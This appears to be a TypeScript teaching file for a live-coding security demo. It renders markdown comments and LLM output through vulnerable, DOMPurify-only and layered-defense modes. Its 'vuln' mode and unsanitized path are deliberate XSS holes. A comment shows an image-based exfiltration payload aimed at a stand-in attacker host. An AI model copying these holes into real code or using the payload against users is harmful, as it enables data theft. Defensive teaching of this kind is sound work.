import { marked } from "marked";
import DOMPurify from "dompurify";

marked.setOptions({ breaks: true });

// =============================================================================
// For the Comment Board (basics). Behavior changes with the safeMode ON/OFF.
// =============================================================================
export function renderComment(markdownText: string, safeMode: boolean): string {
  const rawHtml = marked.parse(markdownText, { async: false }) as string;
  if (!safeMode) return rawHtml; // 🔓 no sanitization
  return DOMPurify.sanitize(rawHtml, {
    ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|#|\/)/i,
  });
}

// =============================================================================
// For the AI part. Three stages of rendering an LLM's (markdown) output on screen.
// The live-coding story is "growing" this function from vuln → dompurify → safe.
// =============================================================================
export type RenderMode = "vuln" | "dompurify" | "safe";

// URL schemes allowed on links (eliminates javascript: at the root).
const SAFE_URL = /^(?:https?:|mailto:|#|\/)/i;

// Only same-origin images are allowed as <img> src.
// External-host images are a prime vector for exfiltration (smuggling secrets out via the URL),
// so we drop them.
function isSameOrigin(src: string): boolean {
  try {
    return new URL(src, location.origin).origin === location.origin;
  } catch {
    return false;
  }
}

export function renderLLM(markdownText: string, mode: RenderMode): string {
  // ★ ORDER MATTERS ★ Always "Markdown → HTML" first, THEN "sanitize".
  //   Reversing it (sanitize → convert) breaks symbols or lets the generated HTML slip through.
  const rawHtml = marked.parse(markdownText, { async: false }) as string;

  // vuln: raw HTML as-is. onerror, javascript:, and image exfiltration all get through.
  if (mode === "vuln") {
    return rawHtml;
  }

  // dompurify: plain DOMPurify.
  //   → onerror and javascript: links are removed (JS execution is blocked).
  //   → BUT <img> is allowed as a "legitimate tag", so
  //     ![](http://attacker/steal?c=secret) still EXFILTRATES — it cannot stop that.
  //   This is exactly why "we added DOMPurify but data still leaks."
  if (mode === "dompurify") {
    return DOMPurify.sanitize(rawHtml);
  }

  // safe: layered defense
  //   (1) allowlist URL schemes on links
  //   (2) remove external-origin images (= cut off exfiltration)
  //   (3) in production, also pair this with a CSP (img-src 'self', etc.)
  const cleaned = DOMPurify.sanitize(rawHtml, { ALLOWED_URI_REGEXP: SAFE_URL });
  const tpl = document.createElement("template");
  tpl.innerHTML = cleaned;
  tpl.content.querySelectorAll("img").forEach((img) => {
    if (!isSameOrigin(img.getAttribute("src") || "")) img.remove();
  });
  return tpl.innerHTML;
}
